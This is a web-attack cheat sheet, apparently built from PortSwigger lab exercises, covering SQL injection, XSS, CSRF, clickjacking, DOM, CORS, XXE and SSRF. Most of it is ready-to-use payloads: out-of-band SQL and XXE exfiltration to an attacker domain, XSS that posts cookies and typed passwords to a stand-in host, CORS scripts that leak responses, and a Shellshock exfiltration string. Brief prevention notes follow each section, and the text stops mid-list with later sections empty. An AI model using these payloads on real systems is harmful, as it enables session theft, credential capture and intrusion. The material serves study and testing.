# Web Knowledge 

## Content table

  * [SQL injection](#sql-injection)
  * [Cross-site scripting](#cross-site-scripting)
  * [Cross-site request forgery (CSRF)](#cross-site-request-forgery)
  * [Clickjacking](#clickjacking)
  * [DOM-based vulnerabilities](#dom-based-vulnerabilities)
  * [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing)
  * [XML external entity (XXE) injection](#xml-external-entity-injection)
  * [Server-side request forgery (SSRF)](#server-side-request-forgery)
  * [HTTP request smuggling](#http-request-smuggling)
  * [OS command injection](#os-command-injection)
  * [Server-side template injection](#server-side-template-injection)
  * [Directory traversal](#directory-traversal)
  * [Access control vulnerabilities](#access-control-vulnerabilities)
  * [Authentication](#authentication)
  * [WebSockets](#websockets)
  * [Web cache poisoning](#web-cache-poisoning)
  * [Insecure deserialization](#insecure-deserialization)
  * [Information disclosure](#information-disclosure)
  * [HTTP Host header attacks](#http-host-header-attacks)
  * [OAuth authentication](#oauth-authentication)


## SQL injection 

A SQL injection (SQLi) is a type of security exploit in which the attacker adds Structured Query Language (SQL) code to a Web form input box in order to gain access to unauthorized resources or make changes to sensitive data. An SQL query is a request for some action to be performed on a database. When executed correctly, a SQL injection can expose intellectual property, the personal information of customers, administrative credentials or private business details.

#### SQLi Basics

Here will be some basics informations to get when you have a successfull injection

- SQL injection attack, querying the database type and version on Oracle

	- Depending on the DB you can get the version as follow:
		- Microsoft, MySQL
		  ```sql
		  SELECT @@version
		  ```
		  
		- Oracle
		    ```sql
			SELECT * FROM v$version`
			```
		- PostgreSQL
			```sql
			SELECT version()
			```
			
- SQL injection attack, listing the database contents 

	- Non-Oracle DB 
		```sql
		select * from information\_schema.tables
		```
	- Oracle DB
		```sql
		select * from all_tables
		```

#### Union SQL attack 

These attacks are perform to extract data using the same amount of row than the initial result could display. For this attack, working conditions are:
-   The individual queries must return the same number of columns.
-   The data types in each column must be compatible between the individual queries

You can have those following examples : 

- Determining the number of columns returned by the query
	 ```sql 	
	' union select NULL-- 
	 ``` 
	 *increasing number of NULL value until values are actually return*
	```sql
	' order by 1-- 
	```
	*increasing the int value until an error occured*
		
		
- Finding a column containing text
	```sql
	union select 'a', NULL, NULL, ...--
	```
	*Add as many null as you need to match the number of columns*
		
		
- Retrieving data from other tables
	```sql
	union select CHAMP1, CHAMP2, .... from TABLE_NAME--
	```
	 *Again add as many null value as needed* 
		
		
- Retrieving multiple values in a single column
	```sql 
	union select CHAMP1 || 'SEPERATOR' || CHAMP2 .... from TABLE_NAME--
	```
	*Very usefull when you only have the capacity to extract data from a uniq column*
		
		
#### Blind SQL attack 

- Conditional responses

	The goal here is to exfiltrate char by char fields using for exemple a query looking like this one : 
	```sql
	' and (select substring(password,1,1) from users where username='administrator')='a`
	```
- Conditional errors

	The goal here is to check errors based on a True query and on a false one. Here is an example:
	 ```sql
	 ' and (select case when (1=2) then 1/0 else 'a' end)='a
	 ``` 
	 => True statement
	
	
	```sql
	' and (select case when (1=1) then 1/0 else 'a' end)='a
	``` 
	=> False statement
	
	
- Time delays

    This one is the favorite of everyone to quickly check for blind SQL. The goal is to insert a sleep function (once or twice to confirm it) and check if there is any latence in the anwser given by the server. If there is one, and if this latence is proportionate to your sleep value, then you know that you've got SQLi. Examples : 
	
	```sql
	';sleep(10)--
	```
	
	```sql
	'; if (1=1) waitfor delay '0:0:5'--
	```
	
	
- Time delays and information retrieval

	Using the techique right above, we can exfiltrate data based on the time the query take to give a result. We will stick with conditional tested char by char. Here is an example : 
	```sql
	'; if (select count(username) from users where username = 'administrator' and substring(password, 1, 1) > 'm') = 1 waitfor delay '0:0:5'--
	```
	
	
- Out-of-band (OAST)

   This type of SQLi is perform against asynchronous system. The goal here is to trigger out-of-band network. We usually use DNS protocol because that's simplier and available on any system. To exfiltrate data we will use conditionals techniques again and more precisely a time delays equivalent. Basicly we will redirect to our controlled domain on True or False condition. For example we can perform those :
   * For Microsoft SQL Server
      		
		```sql
		'; exec master..xp\_dirtree '//MYDOMAIN/a'--
		```
		*basic test*
		
		
		```sql
		declare @q varchar(1024); set @q = 'master..xp\_dirtree '\\\\' + substring(convert(varchar(max), convert(varbinary(max), user\_name()), 1),1,60) + '.MYDOMAIN\\foo'; exec(@q)
		```
		*return data on subdomain param*
		
		
   *  MYSQL
	   			=> Check for the LOAD\_FILE, sys\_eval, http\_get, .. functions
	   
	* ORACLE
		```sql
		select dbms_ldap.init((select version from v$instance)||'.'||(select user from 		dual)||'.'||(select name from 	v$database)||'.'||'MYDOMAIN',80) from 	dual;
		```


- SQL injection vulnerability allowing login bypass
	* Very simple : `username'--`

#### How to prevent them 

If a SQL injection attack is successfully carried out, the damage could be expensive in terms of resources and customer trust. That is why detecting this type of attack in a timely manner is important. Web application firewalls (WAF) are the most common tool used to filter out SQLi attacks. WAFs are based on a library of updated attack signatures and can be configured to flag malicious SQL queries.

In order to prevent a SQL injection attack from occurring in the first place, developers can follow these practices:

-   Avoid SQL statements that allow user input, choose prepared statements and parameterized queries instead.
-   Perform input validation, or sanitization, for user-provided arguments.
-   Do not leave sensitive data in plaintext format, or use encryption.
-   Limit database permissions, privileges and capabilities to the bare minimum.
-   Keep databases updated on security patches.
-   Routinely test the security measures of applications that rely on databases.
-   Remove the display of database error messages to the users.


## Cross-site scripting

Cross-site scripting is used to inject malicious javascript code to user browser. This attack can lead to a total control of the application in use. More details and specific stuff can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

#### Basics


- Exploiting cross-site scripting to steal cookies

	This part represent the principal use of XSS. Web apps usually use cookies to save and remember sessions. In that way, this attack get the cookie in question and send it back to your own domain so you can easily capture it. 
	
	There is comon security system used to avoid this attack:
	-   The victim might not be logged in.
	-   Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
	-   Sessions might be locked to additional factors like the user's IP address.
	-   The session might time out before you're able to hijack it.
	
	Here is an example of that type of XSS:
	```javascript 
	<script> fetch('https://MYDOMAIN', {  method: 'POST',  mode: 'no-cors',  body:document.cookie  });  </script>
	```


- Exploiting cross-site scripting to capture passwords
	
	This technique can be use because of stupid password managers and auto-fill option. Basicly the only thing you have to do is to inject an option in the input label to read data when they are enter. Here is an example : 
	
	```html
	<input name=username id=username>  
	<input type=password name=password onchange="if(this.value.length)fetch('https://MYDOMAIN',{  
	method:'POST',  
	mode: 'no-cors',  
	body:username.value+':'+this.value  
	});">
	```


- Exploiting XSS to perform CSRF

	XSS can also be used to perform CSRF (more details in the next section). Here is an example payload working with token protection enable: 
	
	```javascript
	<script>  
	var req = new XMLHttpRequest();  
	req.onload = handleResponse;  
	req.open('get','/my-account',true);  
	req.send();  
	function handleResponse() {  
	 var token = this.responseText.match(/name="csrf" value="(\\w+)"/)\[1\];  
	 var changeReq = new XMLHttpRequest();  
	 changeReq.open('post', '/my-account/change-email', true);  
	 changeReq.send('csrf='+token+'&email=test@test.com')  
	};  
	</script>
	```


#### Reflected XSS 

Reflected XSS is the simplest variety of cross-site scripting. The application receive data in an HTTP request and includes that data within the immediate response in an unsafe way. Nothing is stored in the webapp and the trigger only works when the user click on the link or whatever with this particular payload include. Here are some examples : 

- HTML context with nothing encoded

	 ```javascript
	 <script>alert(1)</script>
	 ```
 
 
- HTML context with most tags and attributes blocked

	```html 
	<iframe src="https://WEBSITE/?search="><body onresize=alert(document.cookie)>" onload=this.style.width='100px'>
	```


- HTML context with all tags blocked except custom ones

	```javascript
	<script>  
	location = 'https://WEBSITE/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x';  
	</script>
	```


- Event handlers and href attributes blocked

	```javascript
	https://WEBSITE/?search=<svg><a><animate+attributeName=href+values=javascript:alert(1)+/><text+x=20+y=20>Click me</text></a>
	```

- Some SVG markup allowed

	```javascript
	https://WEBSITE/?search="><svg><animatetransform onbegin=alert(1)>
	```


- Reflected XSS with AngularJS sandbox escape without strings

	```javascript
	https://your-lab-id.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d\[\].join;\[1\]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
	```
	
	
- Reflected XSS with AngularJS sandbox escape and CSP

	```html
	<script>  
	location='https://your-lab-id.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';  
	</script>
	```
	

#### Stored XSS 
Stored XSS is an injection in the actual page by any way (message, template injection, input, ...). Here are some examples: 

- Stored XSS into anchor href attribute with double quotes HTML-encoded

	 ```javascript
	 javascript:alert('XSS')
	 ```
	 
	 
- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

	```javascript
	&apos;-alert(1)-&apos;
	```
	

#### DOM XSS 

DOM Based XSS is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an “unexpected” manner. That is, the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

As the vulnaribility is app specific, there will be no example and you will have to use your brain. 


#### Escape CSP

CSP or 'Content Security Policy ' is a protection to XSS, clickjacking, code injection and more. CSP can be found on the server answer. You can use a [checker](https://csp-evaluator.withgoogle.com/) to dig in what you have in front of you. As the topic is large again here is a [link](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass) to understand what the checker gave you 


#### How to prevent them 

-   **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
-   **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
-   **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
-   **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.



## Cross-site request forgery

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. This attack can happend by phishing, clone site, etc ... Conditions have to be present for this attack  to be perform : 

-   **A relevant action.** : Change password, email, rights, ...
-   **Cookie-based session handling.** : Website with cookie base for sessions are an incredible candidate for this type of attack
-   **No unpredictable request parameters.** Every element should be known or obtainable to be able to forge the request

Here is a schema to check for CSRF from PATT:

![alt CSRF_Detection](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/CSRF%20Injection/Images/CSRF-CheatSheet.png?raw=true)


#### Some examples

- No defenses
 ```html
	<form method="$method" action="$url">  
	 <input type="hidden" name="$param1name" value="$param1value">  
	</form>  
	<script>  
	 document.forms\[0\].submit();  
	</script>
 ```

-JSon and JS combined

   ```javascript
	<script>
	var xhr \= new XMLHttpRequest();
	xhr.open("POST", "http://www.example.com/api/setrole");
	xhr.setRequestHeader("Content-Type", "text/plain");
	//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	//xhr.setRequestHeader("Content-Type", "multipart/form-data");
	xhr.send('{"role":admin}');
	</script>
   ```

#### How to prevent them 

-   Unpredictable with high entropy, as for session tokens in general.
-   Tied to the user's session.
-   Strictly validated in every case before the relevant action is executed.


## Clickjacking

Clickjacking is an interface-based attack in which a user is tricked into clicking on actionable content on a hidden website by clicking on some other content in a decoy website. 

Example (from imperva.com) : 
1.  The attacker creates an attractive page which promises to give the user a free trip to Tahiti.
2.  In the background the attacker checks if the user is logged into his banking site and if so, loads the screen that enables transfer of funds, using query parameters to insert the attacker’s bank details into the form.
3.  The bank transfer page is displayed in an invisible iframe above the free gift page, with the “Confirm Transfer” button exactly aligned over the “Receive Gift” button visible to the user.
4.  The user visits the page and clicks the “Book My Free Trip” button.
5.  In reality the user is clicking on the invisible iframe, and has clicked the “Confirm Transfer” button. Funds are transferred to the attacker.
6.  The user is redirected to a page with information about the free gift (not knowing what happened in the background).


![alt CJ example](https://www.imperva.com/learn/wp-content/uploads/sites/13/2019/01/Clickjacking.png.webp)

#### Some examples

- Basic clickjacking with CSRF token protection

	1. Construct a page looking like : 

	```html
		<style>  
		 iframe {  
		 position:relative;  
		 width:$width\_value;  
		 height: $height\_value;  
		 opacity: $opacity;  // Set opacity to make the button transparent
		 z-index: 2;  
		 }  
		 div {  
		 position:absolute;  
		 top:$top\_value;  // Change this to fully cover the baiting action
		 left:$side\_value;  // Change this to fully cover the baiting action
		 z-index: 1;  
		 }  
		</style>  
		<div>Test me</div>  
		<iframe src="$url"></iframe>
	```
	
	2. Send the link to the victime and pray


- Clickjacking with form input data prefilled from a URL parameter

	1. Construct a page looking like : 
		```html
		<style>  
		   iframe {  
			   position:relative;  
			   width:$width_value;  
			   height: $height_value;  
			   opacity: $opacity;  
			   z-index: 2;  
		   }  
		   div {  
			   position:absolute;  
			   top:$top_value;  
			   left:$side_value;  
			   z-index: 1;  
		   }  
		</style>  
		<div>Test me</div>  
		<iframe src="$url?email=hacker@attacker-website.com"></iframe>
		```

	2. Send the link to the victime and pray


- Exploiting clickjacking vulnerability to trigger DOM-based XSS

	1. Construct a page looking like:
	
	```html
		<style>  
	 iframe {  
	 position:relative;  
	 width:$width\_value;  
	 height: $height\_value;  
	 opacity: $opacity;  
	 z-index: 2;  
	 }  
	 div {  
	 position:absolute;  
	 top:$top\_value;  
	 left:$side\_value;  
	 z-index: 1;  
	 }  
	</style>  
	<div>Test me</div>  
	<iframe  
	src="$url?name=<img src=1 onerror=alert(document.cookie)>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
	```
	
	2. Send the link to the victime and pray
	
- Multistep clickjacking

Just include as much button as you need

```html
	<style>  
	 iframe {  
	 position:relative;  
	 width:$width\_value;  
	 height: $height\_value;  
	 opacity: $opacity;  
	 z-index: 2;  
	 }  
	 .firstClick, .secondClick {  
	 position:absolute;  
	 top:$top\_value1;  
	 left:$side\_value1;  
	 z-index: 1;  
	 }  
	 .secondClick {  
	 top:$top\_value2;  
	 left:$side\_value2;  
	 }  
	</style>  
	<div class="firstClick">Test me first</div>  
	<div class="secondClick">Test me next</div>  
	<iframe src="$url"></iframe>
```



#### How to prevent them 

Two main option are in use to prevend them: 

-	 X-frame-options: 
	-	 deny : Make the site impossible to include into ifram balise
	-	 sameorigin: Make ifram only useable on the same website
	-	 allow-from: Specify URL that can include the website iframe 

-	CSP: You can use a lot of CSP option to restrict page inclusion




## DOM-based vulnerabilities

DOM-based vulnerabilities are based on javascript values controlled by attackers *called source* and use it in dangerous functions *called sink* (values can be cookies or whatever and functions can be eval like ones so by modifying the cookie you've got RCE).

Sources are very often :
- document.URL  
- document.documentURI  
- document.URLUnencoded  
- document.baseURI  
- location  
- document.cookie  
- document.referrer  
- window.name  
- history.pushState  
- history.replaceState  
- localStorage  
- sessionStorage  
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)  
- Database

Sink related to vulnerabilites are (thanks to portswigger):

DOM-based vulnerability | Example sink
:----: | :----:
DOM XSS  | `document.write()`
Open redirection | `window.location`
Cookie manipulation | `document.cookie`
JavaScript injection | `eval()`
Document-domain manipulation | `document.domain`
WebSocket-URL poisoning | `WebSocket()`
Link manipulation | `someElement.src`
Web-message manipulation | `postMessage()`
Ajax request-header manipulation | `setRequestHeader()`
Local file-path manipulation | `FileReader.readAsText()`
Client-side SQL injection | `ExecuteSql()`
HTML5-storage manipulation | `sessionStorage.setItem()`
Client-side XPath injection | `document.evaluate()`
Client-side JSON injection | `JSON.parse()`
DOM-data manipulation | `someElement.setAttribute()`
Denial of service | `RegExp()`


There is also DOM clobbering, same goal, different approach, your goal here is to inject HTML and then perform DOM basis

#### Some examples



- Web messages
	
	Here you are in the situation where your page contained an `addEventListener` and wait for an input
	
	You can put the following message: 
	
	```html
	<iframe src="WEBSITE" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','\*')">
	```
	
	OR
	
	```html
	<iframe src="WEBSITE" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','\*')">
	```
	
	OR 
	
	```<iframe src=https://your-lab-id.web-security-academy.net/ onload='this.contentWindow.postMessage("{\\"type\\":\\"load-channel\\",\\"url\\":\\"javascript:alert(document.cookie)\\"}","\*")'>
	```
	
	Base your payload on the method use to upload a message.
	
	The iframe will post the message and dump it on the page, you will be able to get the cookie that way
	

- DOM-based open redirection

	The website have a similar output than the following one :
	
	```html
		<a href='#' onclick='returnURL' = /url=https?:\\/\\/.+)/.exec(location); if(returnUrl)location.href = returnUrl\[1\];else location.href = "/"'>Back to Blog</a>
	 ```
	 
	 So you can use it by sending for example the following url :
	 
	 `https:/WEBSITE/post?postId=4&url=YOURWEBSITE`
	 
	 
- DOM-based cookie manipulation

	Here is an example for the following scenario :
	1. You are on a website that store last page seen as a cookie
	
	2. Your first action is to inject an iframe where you match an existing page and add some payload after it.
	
	3. When the iframe is load by the victime browser, it will open the src temporarily and set the cookie to the payload

	4. Then the iframe will execute the `onload` function and redirect the victime to an other page of your choice. 

	5. By loading the page the cookie will be stored and execute so is your payload, the victime is not able to see it in anyway (if your victime is Mr/Mrs Michu)
	
	```html
	<iframe src="WEBSITE/sell?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='WEBSITE';window.x=1;">
	```
	
#### How to prevent it 

- Untrusted data have to be handle carefully  


## Cross-origin resource sharing

Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.  It can provide an attack vector to cross-domain based attacks, if a website's CORS policy is poorly configured and implemented. 

To check for the Access-Control-Allow-Origin value you can send a request including the following header:
`Origin: WEBSITE`

The presence of Access-Control-Allow-Credentials is a good indicator of potential CORS.

#### Some examples

- Basic origin reflection

	On your website you can place a script looking like this one : 
	
	```javascript
	<script>  
	 var req = new XMLHttpRequest();  
	 req.onload = reqListener;  
	 req.open('get','FULL_URL_TO_TARGET',true);  
	 req.withCredentials = true;  
	 req.send();  

	 function reqListener() {  
	 location='/log?key='+this.responseText;  
	 };  
	</script>
     ```
	 
	 This script will fetch the FULL_URL_TO_TARGET page using the Access-Control-Allow-Credentials header. Then when the page will be loaded, it will take the page data  and send it back to you on your website.
	 
	 
- Trusted null origin

	Basicly this is the same as the previous one, just include the ifram with sandbox options => `sandbox="allow-scripts allow-top-navigation allow-forms"`

	```javascript
	<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>  
	 var req = new XMLHttpRequest ();  
	 req.onload = reqListener;  
	 req.open('get','FULL_URL_TO_TARGET',true);  
	 req.withCredentials = true;  
	 req.send();  

	 function reqListener() {  
	 location='YOUR_WEBSITE/log?key='+encodeURIComponent(this.responseText);  
	 };  
	</script>"></iframe>
	```
	
	
- Internal network pivot attack

	This one is the trickier, it will follow these steps:
	
	1. Scan for endpoint in the internal network, it will fetch a XSS on the scanned page, your website log should include port and the corresponding ip.
	
		```javascript
		<script>
		var q = [], collaboratorURL = 'YOURWEBSITE';
		for(i=1;i<=255;i++){
		  q.push(
		  function(url){
			return function(wait){
			fetchUrl(url,wait);
			}
		  }('http://192.168.0.'+i+':8080'));
		}
		for(i=1;i<=20;i++){
		  if(q.length)q.shift()(i*100);
		}
		function fetchUrl(url, wait){
		  var controller = new AbortController(), signal = controller.signal;
		  fetch(url, {signal}).then(r=>r.text().then(text=>
			{
			location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
		  }
		  ))
		  .catch(e => {
		  if(q.length) {
			q.shift()(wait);
		  }
		  });
		  setTimeout(x=>{
		  controller.abort();
		  if(q.length) {
			q.shift()(wait);
		  }
		  }, wait);
		}
		</script>
		```
		
		2. Then you will be able to go for XSS fetching, using information previously retrieve

		```javascript
		<script>  
		function xss(url, text, vector) {  
		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
		}  

		function fetchUrl(url, collaboratorURL){  
		 fetch(url).then(r=>r.text().then(text=>  
		 {  
		 xss(url, text, '"><img src='+collaboratorURL+'?isXSS=1>');  
		 }  
		 ))  
		}  

		fetchUrl("http://IP_FOUND", "YOURWEBSITE");  
		</script>
		```

		3. From the previous step, you will locate a potential XSS, if you find one it would be display in your website logs using `isXSS=1`. In this part we will go for the XSS exploit and retrieve the web page content.

		```javascript
		<script>  
		function xss(url, text, vector) {  
		 location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="(\[^"\]+)"/)\[1\];  
		}  
		function fetchUrl(url, collaboratorURL){  
		 fetch(url).then(r=>r.text().then(text=>  
		 {  
		 xss(url, text, '"><iframe src=/admin onload="new Image().src=\\''+collaboratorURL+'?code=\\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');  
		 }  
		 ))  
		}  

		fetchUrl("http://IP_FOUND", "YOURWEBSITE");    
		</script>
		```
		
		4. Then you are free to do whatever you want, iframe injection, CSRF, ...
	
		
#### How to prevent them 

CORS are only present due to misconfigurations, you can use these headers to configure it correctly (and also use your brain again):
   -	Access-Control-Allow-Origin: 
	   -	Allow content from listed websites
	   -	Avoid null value => cab ve exploit as we see above
	   -	Avoid local things as you don't protect your colleagues actions


## XML external entity injection

XXE is a specific attack against XML application. It can allow an attacker to view files, interact directly with the backend, or other application related to the corrupt one. This attack is perform as an initial vector for SSRF. To check for the vulnerability you will have to intercept the request and change the post data. Post data are used in 99.99% for XML applications.

#### Basics

- External entities to retrieve files

	Simple payload to retrieve a file from the filesystem
	
	```xml
	<!DOCTYPE test \[ <!ENTITY [xxe](https://portswigger.net/web-security/xxe) SYSTEM "file:///etc/passwd"> \]>
	```
		

- Perform SSRF attacks

	As the previous one simple payload, you can adapt the IP by using URL to fetch APIs or whatever
	
	```xml
	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "http://127.0.0.1/"> \]>
	```
	

#### Blind XXE

- Out-of-band interaction

	In this attack you will use the same payload as for the SSRF combined attack, but you will use your IP to check for inbound traffic.
	
	```xml
	<!DOCTYPE test \[ <!ENTITY xxe SYSTEM "YOUR_DOMAIN_OR_IP"> \]>
	```
	
- Out-of-band interaction via XML parameter entities

	Same principle and a similar payload but two different test
	
	```xml
	<!DOCTYPE stockCheck \[<!ENTITY % [xxe](https://portswigger.net/web-security/xxe) SYSTEM "YOUR_DOMAIN_OR_IP"> %xxe; \]>
	```
	

- Exfiltrate data using a malicious external DTD

	First, DTD is a text file that store XML attributes and elements used by an application.
	This exfiltration has two phases:
	
	1. You will have to host the DTD file on your website and it should be accessible for external use. This file should contain the following payload:
		
		```xml
		<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
		<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'YOURDOMAIN/?log=%file;'>"> 
		%eval;  
		%exfil;
		```
	
	
	2. Then exploit as you will do an classical exfiltration but you should specify the DTD file as follow : 

		```xml
		<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD_URL"> %xxe;]>
		```
	
	
	3. Now you should tcpdump or go to your website logs to view the file you want to retrieve.
	
- Retrieve data via error messages

	This attack has the same action than the external DTD we saw previously. You just need to replace the step 1 payload with the following one:
	
	```xml
	<!ENTITY % file SYSTEM "file://FILE_PATH_TO_RETRIEVE">  
	<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">  
	%eval;  
	%exfil;
	```
	
	This will throw an error containing the file you specify
	
- Retrieve data by repurposing a local DTD

	For this one you need to find a local DTD on the system. Once you get it you can simply redeclare a function and trigger for example the error based exfiltration. In this example we suppose that the local file is  `DTD_LOCAL_FILE` and the entity inside is called `PWNME`. The following payload is to include on the XML post data :
	
	```xml
	<!DOCTYPE message [
	<!ENTITY % local_dtd SYSTEM "file://DTD_LOCAL_FILE">
	<!ENTITY % PWNME '
	<!ENTITY &#x25; file SYSTEM "file://FILE_PATH_TO_RETRIEVE">
	<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
	&#x25;eval;
	&#x25;error;
	'>
	%local_dtd;
	]>
	```


#### Others examples

- Exploiting XInclude to retrieve files

	Back to basics, simple efficient payload :
	
	```xml
	<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://FILE_PATH_TO_RETRIEVE"/></foo>
	```
	
	
- Exploiting XXE via image file upload

	For this attack you will have to prepare a SVG file containing the following payload and adapt parameters :
	
	```xml 
	<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://FILE_PATH_TO_RETRIEVE" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
	```

	Then just upload it as an image and you should have the file data in your image display
	
	
#### How to prevent them 

XXE exist due to bad handle of user input or used of dangerous function in used librairie.
The best way to prevent them is to include only necessaries functions or remove unnecessaries ones. Import ones to disable is `XInclude` and `external entities resolutions`

## Server-side request forgery

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data to, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like http enabled databases or perform post requests towards internal services which are not intended to be exposed.

![alt Server-Side Request Forgery](https://www.vaadata.com/blog/wp-content/uploads/2018/05/SSRF-EN.jpg)

#### Basics
- Local server

	This attack can be perform thanks to the loopback interface. Basicly you will have to find a parameter that fetch or possibly fetch an URL and loopback on the server himself to request the api or whatever. 
	
	For example with the website `fanOfNothing.com`, on the page `store`, the search engine included will pass your search to the api using the following post request : `searchFor=fanOfNothing.com:8008/api/search`. So your way to access what you want to is to change the `fanOfNothing.com:8008/api/search` to for example `fanOfNothing.com/admin`. In that way the result will be the admin page and not the initial response
	
	
- Against another back-end system

	Basicly the same, just scan for internal APIs and then fuzz endpoint and get result on the search thing

#### Bypassing filters

- SSRF with blacklist-based input filter

	Basicly for this you will need imagination and a good understanding of what you have in front of you. For example if 127.0.0.1 is block you can replace it by 127.1 you can double url encode strings, etc ... 
	
	
- SSRF with whitelist-based input filter

	This one is very well explained by portswigger so here is the essentials.
	
	To bypass whitelisting you can use thse following techniques :
	-   You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
	-   You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
	-   You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
	-   You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
	-   You can use combinations of these techniques together.


- SSRF with filter bypass via open redirection vulnerability

	Same as the previous ones. Here is a payload example :
	`param=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://INTERNAL_IP/WHATEVER`


#### Blind exploitation
- Blind SSRF with out-of-band detection

	Easiest blind attack to perform. If you just want to see if SSRF is a thing on the site, bounce back on your domain / IP and tcpdump to check incoming traffic. 
	
	
- Blind SSRF with Shellshock exploitation

	This will principally lead to RCE, you can set the following payload (`() { :; }; /usr/bin/nslookup $(COMMAND).YOUR_DOMAIN`) on the Web agent field and exploit the SSRF as indicate in previous setps

#### How to prevent them 

You have several way to implement a protection for this type of attack. Here are some of them :	

-	Input validation (regex, whitelist, ...)
-	If you are using .NET, it can be expose to hex, dword, octal and mixed encoding
-	Ensure that the domain is a trusted and valid one
-	Configure a firewall to explicitly set legitimate flows
-	....



## HTTP request smuggling

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.

HTTP request smuggling is an attack based on bad request handling between front and backend. The front end receive the user packet and transfer data or request to the backend. In that way you can chunk your original request and perform a double request in one paquet send. In that way you can bypass some protections.  

Different types of HTTP request smuggling exist, they are :

-   CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
-   TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
-   TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.

#### Basics

- HTTP request smuggling, basic CL.TE vulnerability
- HTTP request smuggling, basic TE.CL vulnerability


#### Confirming vulnerabilities

- HTTP request smuggling, confirming a CL.TE vulnerability via differential responses
- HTTP request smuggling, confirming a TE.CL vulnerability via differential responses


#### Bypass front-end protections
- Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
- Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability


#### Advanced

- Exploiting HTTP request smuggling to reveal front-end request rewriting
- Exploiting HTTP request smuggling to capture other users' requests
- Exploiting HTTP request smuggling to deliver reflected XSS
- Exploiting HTTP request smuggling to perform web cache poisoning
- Exploiting HTTP request smuggling to perform web cache deception


#### How to prevent them

How can implement a rejection of wierd / malformed request or also do these following actions :

-   Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.
-   Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.
-   Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests.



## OS command injection

OS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running an application. This can lead to full server compromision.

This attack is really based on what you saw on the website and how does it handle everything.


#### Some examples

- Blind OS command injection with time delays
- Blind OS command injection with output redirection
- Blind OS command injection with out-of-band interaction
- Blind OS command injection with out-of-band data exfiltration


#### How to prevent them

Basicly never call an OS command on your web app code and also :

